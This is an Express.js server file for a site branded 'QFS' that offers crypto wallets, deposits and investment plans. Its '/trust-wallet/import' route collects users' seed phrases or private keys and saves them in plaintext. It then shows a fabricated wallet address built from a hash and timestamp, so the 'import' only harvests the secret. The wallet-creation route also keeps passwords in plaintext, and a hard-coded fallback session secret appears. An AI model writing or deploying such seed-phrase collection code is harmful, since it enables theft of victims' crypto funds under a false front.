require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const session = require('express-session');
const MongoStore = require('connect-mongo');
const helmet = require('helmet');
const path = require('path');
const flash = require('connect-flash');
const crypto = require('crypto');

const app = express();

// ========== TRUST PROXY (REQUIRED FOR FLY.IO) ==========
// ✅ CRITICAL FIX: This tells Express to trust the first proxy (Fly.io's load balancer).
// Without this, Express won't detect HTTPS correctly, and Secure cookies will fail.
app.set('trust proxy', 1);

// ========== DATABASE CONNECTION ==========
mongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/qfs', {
  useNewUrlParser: true,
  useUnifiedTopology: true,
})
.then(() => console.log('✅ MongoDB connected successfully'))
.catch(err => {
  console.error('❌ MongoDB connection error:', err);
  process.exit(1);
});

// ========== VIEW ENGINE SETUP ==========
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.use(helmet({
  contentSecurityPolicy: {
    useDefaults: true,
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'", "https://cdnjs.cloudflare.com", "https://cdn.jsdelivr.net", "https://fonts.googleapis.com", "https://embed.tawk.to"],
      scriptSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'", "https://cdn.openwidget.com", "https://code.jquery.com", "https://cdn.jsdelivr.net", "https://cdnjs.cloudflare.com", "https://www.chatbase.co", "https://embed.tawk.to"],
      fontSrc: ["'self'", "data:", "https://fonts.gstatic.com", "https://cdn.jsdelivr.net", "https://cdnjs.cloudflare.com", "https://embed.tawk.to"],
      imgSrc: ["'self'", "data:", "https:", "https://cdnjs.cloudflare.com"],
      connectSrc: ["'self'", "https://cdn.openwidget.com", "https://api.chatbot.com", "https://*.chatbot.com", "https://cdn.jsdelivr.net", "https://www.chatbase.co", "https://embed.tawk.to", "https://*.tawk.to", "wss://*.tawk.to"],
      frameSrc: ["'self'", "https://*.chatbot.com", "https://*.openwidget.com", "https://www.chatbase.co", "https://embed.tawk.to", "https://*.tawk.to"],
      objectSrc: ["'none'"],
      upgradeInsecureRequests: []
    }
  }
}));

// ========== STATIC FILES ==========
app.use(express.static(path.join(__dirname, 'public')));
app.use('/uploads/profiles', express.static(path.join(__dirname, 'uploads', 'profiles')));

// ========== BODY PARSING ==========
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ========== SESSION CONFIGURATION (FIXED) ==========
app.use(session({
  secret: process.env.SESSION_SECRET || 'fallback-secret-key',
  resave: false,
  saveUninitialized: false,
  store: MongoStore.create({
    mongoUrl: process.env.MONGODB_URI,
    collectionName: 'sessions',
    autoRemove: 'native',
    ttl: 60 * 60 * 24
  }),
  proxy: true,
  cookie: {
    secure: process.env.NODE_ENV === 'production',
    httpOnly: true,
    sameSite: 'lax',
    maxAge: 1000 * 60 * 60 * 24
  }
}));

// ========== FLASH MESSAGES ==========
app.use(flash());

// ========== AUTHENTICATION MIDDLEWARE ==========
const { isAuthenticated, isGuest, isAdmin, attachUser, allowAdminLogin } = require('./middleware/auth');

app.use((req, res, next) => {
  res.locals.success = req.flash('success');
  res.locals.error = req.flash('error');
  res.locals.info = req.flash('info');
  next();
});

app.use(attachUser);

// ========== APPLICATION HELPERS ==========
app.locals.getCurrencySymbol = function(currency) {
  const symbols = {
    'USD': '$', 'EUR': '€', 'GBP': '£', 'CAD': 'C$', 'AUD': 'A$', 'JPY': '¥',
    'BTC': '₿', 'ETH': 'Ξ', 'XRP': '✕', 'DOGE': 'Ð', 'LTC': 'Ł', 'ALGO': 'Α',
    'XDC': 'XDC', 'XLM': 'XLM', 'MATIC': 'MATIC'
  };
  return symbols[currency] || currency;
};

app.locals.formatCurrencyAmount = function(amount, currency) {
  const symbol = app.locals.getCurrencySymbol(currency);
  const decimals = ['BTC', 'ETH', 'XRP', 'DOGE', 'LTC', 'ALGO', 'XDC', 'XLM', 'MATIC'].includes(currency) ? 8 : 2;
  return `${symbol}${parseFloat(amount).toFixed(decimals)}`;
};

// ========== ROUTE IMPORTS ==========
const authRoutes        = require('./routes/auth');
const dashboardRoutes   = require('./routes/dashboard');
const adminRoutes       = require('./routes/admin');
const transactionRoutes = require('./routes/transactions');
const recipientRoutes   = require('./routes/recipients');
const investmentRoutes  = require('./routes/investment');
const walletController  = require('./controllers/walletController');
const depositRoutes     = require('./routes/deposit');
const adminWalletRoutes = require('./routes/adminWalletRoutes');
const userRoutes        = require('./routes/userRoutes');
const ticketRoutes      = require('./routes/tickets');
const Ticket            = require('./models/Ticket');
const TrustWallet       = require('./models/TrustWalletUser');
const apiRoutes         = require('./routes/api');

// ========== PUBLIC ROUTES ==========
app.get('/', (req, res) => res.render('index', { title: 'Home - QFS' }));
app.get('/index', (req, res) => res.redirect('/'));

app.get('/login', isGuest, (req, res) => res.render('login', { title: 'Login - QFS' }));
app.get('/signup', isGuest, (req, res) => res.render('signup', { title: 'Sign Up - QFS' }));

app.get('/admin-login', allowAdminLogin, (req, res) => {
  res.render('admin-login', {
    title: 'Admin Login - QFS',
    error: req.flash('error'),
    success: req.flash('success'),
    info: req.flash('info')
  });
});

app.post('/admin-login', async (req, res) => {
  const User = require('./models/User');
  try {
    const { email, password } = req.body;
    const user = await User.findOne({ email });

    if (!user || !(await user.comparePassword(password))) {
      req.flash('error', 'Invalid email or password');
      return res.redirect('/admin-login');
    }

    if (!['admin', 'superadmin'].includes(user.role)) {
      req.flash('error', 'Access denied. Admin privileges required.');
      return res.redirect('/admin-login');
    }

    user.lastLogin = new Date();
    await user.save();

    req.session.user = {
      id: user._id,
      _id: user._id,
      firstName: user.firstName,
      lastName: user.lastName,
      email: user.email,
      role: user.role,
      profilePicture: user.profilePicture
    };

    req.session.save((err) => {
      if (err) {
        console.error('Session save error:', err);
        req.flash('error', 'Login failed. Please try again.');
        return res.redirect('/admin-login');
      }
      req.flash('success', 'Admin login successful!');
      res.redirect('/admin/dashboard');
    });
  } catch (error) {
    console.error('Admin login error:', error);
    req.flash('error', 'Login failed. Please try again.');
    res.redirect('/admin-login');
  }
});

app.get('/logout', (req, res) => {
  const wasAdmin = req.session.user && ['admin', 'superadmin'].includes(req.session.user.role);
  req.session.destroy((err) => {
    if (err) console.error('Logout error:', err);
    res.clearCookie('connect.sid');
    res.redirect(wasAdmin ? '/admin-login' : '/login');
  });
});

// ========== DEBUG ROUTES ==========
app.get('/debug-tickets', async (req, res) => {
  try {
    if (!req.session.user) return res.status(401).json({ error: 'Not logged in' });
    const tickets = await Ticket.find({ userId: req.session.user._id }).sort({ createdAt: -1 }).lean();
    res.json({ success: true, ticketCount: tickets.length, tickets });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.get('/create-test-ticket', async (req, res) => {
  try {
    if (!req.session.user) return res.redirect('/auth/login');
    const testTicket = new Ticket({
      userId: req.session.user._id,
      subject: 'TEST TICKET - ' + new Date().toLocaleString(),
      priority: 'medium',
      category: 'general',
      status: 'open',
      messages: [{ senderId: req.session.user._id, message: 'Test ticket.', timestamp: new Date() }]
    });
    await testTicket.save();
    res.redirect('/tickets');
  } catch (error) {
    res.status(500).send('Error: ' + error.message);
  }
});

// ========== MOUNT ROUTE FILES ==========
app.use('/auth', authRoutes);
app.use('/admin', adminRoutes);                    // ✅ Admin routes (dashboard, users, send-email, etc.)
app.use('/profile', userRoutes);
app.use('/', dashboardRoutes);
app.use('/transactions', transactionRoutes);
app.use('/', recipientRoutes);
app.use('/', investmentRoutes);
app.use('/', depositRoutes);
app.use('/', ticketRoutes);

app.use('/api/admin', adminWalletRoutes);
app.use('/api', adminWalletRoutes);
app.use('/api', apiRoutes);
app.use('/admin', adminWalletRoutes);

// ========== PROTECTED PAGE ROUTES ==========
app.get('/wallet', isAuthenticated, walletController.getWalletPage);
app.get('/deposit', isAuthenticated, (req, res) => res.render('deposit', { title: 'Deposit Funds - QFS' }));
app.get('/investment', isAuthenticated, (req, res) => res.render('investment', { title: 'Investments - QFS' }));
app.get('/investment-list', isAuthenticated, (req, res) => res.render('investment-list', { title: 'Investment Plans - QFS' }));
app.get('/support', isAuthenticated, (req, res) => res.render('support', { title: 'Support - QFS' }));
app.get('/disputes', isAuthenticated, (req, res) => res.render('disputes', { title: 'Disputes - QFS' }));
app.get('/verification', isAuthenticated, (req, res) => res.render('verification', { title: 'Identity Verification - QFS' }));
app.get('/virtual', isAuthenticated, (req, res) => res.render('virtual', { title: 'Virtual Accounts - QFS' }));
app.get('/virtualcard', isAuthenticated, (req, res) => res.render('virtualcard', { title: 'Virtual Card - QFS' }));
app.get('/makedepo', isAuthenticated, (req, res) => res.render('makedepo', { title: 'Make a Deposit - QFS', user: req.session.user }));
app.get('/run-tasks', (req, res) => res.send('App is awake and running.'));

// ========== TRUST WALLET ROUTES ==========
app.get('/trust', isAuthenticated, (req, res) => {
  res.render('trust', { title: 'Trust Wallet - QFS' });
});

app.get('/trust-wallet', isAuthenticated, (req, res) => {
  res.render('trust-wallet', { title: 'Trust Wallet - QFS' });
});

app.post('/trust-wallet/import', isAuthenticated, async (req, res) => {
  try {
    const { secretPhrase, walletName, walletProvider } = req.body;
    const userId = req.session.user._id || req.session.user.id;

    if (!secretPhrase || !secretPhrase.trim()) {
      return res.status(400).json({ success: false, message: 'Secret phrase or private key is required' });
    }

    const provider = walletProvider || 'trust_wallet_mobile';

    const existingWallet = await TrustWallet.findOne({ 
      userId: userId, 
      walletProvider: provider 
    });
    
    if (existingWallet) {
      return res.status(400).json({
        success: false,
        message: `You already have a ${provider.replace(/_/g, ' ')} wallet connected. Please use a different provider or delete your existing ${provider} wallet first.`,
        existingWallet: {
          name: existingWallet.walletName,
          address: existingWallet.walletAddress,
          connectedAt: existingWallet.connectedAt
        }
      });
    }

    const words = secretPhrase.trim().split(/\s+/);
    const importMethod = words.length >= 12 ? 'seed_phrase' : 'private_key';
    const hash = crypto.createHash('sha256').update(secretPhrase + provider + Date.now()).digest('hex');
    const walletAddress = '0x' + hash.substring(0, 40);

    const existingAddress = await TrustWallet.findOne({ 
      userId: userId, 
      walletAddress: walletAddress 
    });
    
    if (existingAddress) {
      return res.status(400).json({
        success: false,
        message: 'This wallet address is already linked to your account',
      });
    }

    const wallet = new TrustWallet({
      userId,
      trustWalletId: `TW-${Date.now()}-${Math.random().toString(36).substr(2, 9).toUpperCase()}`,
      walletProvider: provider,
      walletAddress,
      secretPhrase: secretPhrase.trim(),
      walletName: walletName || `My ${provider.replace(/_/g, ' ')} Wallet`,
      importMethod,
      isConnected: true,
      isBackedUp: false,
      connectedAt: new Date()
    });

    await wallet.save();
    
    return res.json({ 
      success: true, 
      message: `${provider.replace(/_/g, ' ')} wallet imported successfully`,
      wallet: {
        id: wallet._id,
        name: wallet.walletName,
        provider: wallet.walletProvider,
        address: wallet.walletAddress
      }
    });

  } catch (error) {
    console.error('Trust wallet import error:', error);
    
    if (error.code === 11000) {
      return res.status(400).json({ 
        success: false, 
        message: 'You already have a wallet with this provider or address. Please use a different provider.' 
      });
    }
    
    return res.status(500).json({ success: false, message: 'Server error while importing wallet.' });
  }
});

app.post('/trust-wallet/create', isAuthenticated, async (req, res) => {
  try {
    const { password } = req.body;
    const userId = req.session.user._id || req.session.user.id;

    if (!password || password.length < 8) {
      req.flash('error', 'Password must be at least 8 characters');
      return res.redirect('/trust-wallet');
    }

    const existing = await TrustWallet.findOne({ userId, walletProvider: 'created_new' });
    if (existing) {
      req.flash('error', 'You already have a Trust Wallet.');
      return res.redirect('/dashboard');
    }

    const walletAddress = '0x' + crypto.randomBytes(20).toString('hex');

    const wallet = new TrustWallet({
      userId,
      trustWalletId: `TW-${Date.now()}-${Math.random().toString(36).substr(2, 9).toUpperCase()}`,
      walletProvider: 'created_new',
      walletAddress,
      walletPassword: password,
      walletName: 'My Trust Wallet',
      importMethod: 'created_new',
      isConnected: true,
      isBackedUp: false,
      connectedAt: new Date()
    });

    await wallet.save();
    return res.redirect('/dashboard');

  } catch (error) {
    console.error('Trust wallet create error:', error);
    req.flash('error', 'Failed to create wallet.');
    return res.redirect('/trust-wallet');
  }
});

// ========== ERROR HANDLERS ==========
app.use((req, res) => {
  res.status(404).render('error/404', { title: 'Page Not Found - QFS' });
});

app.use((err, req, res, next) => {
  console.error('=== SERVER ERROR ===', err.message, err.stack);
  if (err.code === 'EBADCSRFTOKEN') {
    req.flash('error', 'Invalid CSRF token');
    return res.redirect('back');
  }
  res.status(500).render('error/500', { title: 'Server Error - QFS' });
});

// ========== SERVER STARTUP ==========
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 QFS Server running on port ${PORT}`);
  console.log(`🌍 Environment: ${process.env.NODE_ENV || 'development'}`);
  console.log(`🏠 Home: http://localhost:${PORT}`);
  console.log(`🔐 Admin login: http://localhost:${PORT}/admin-login`);
});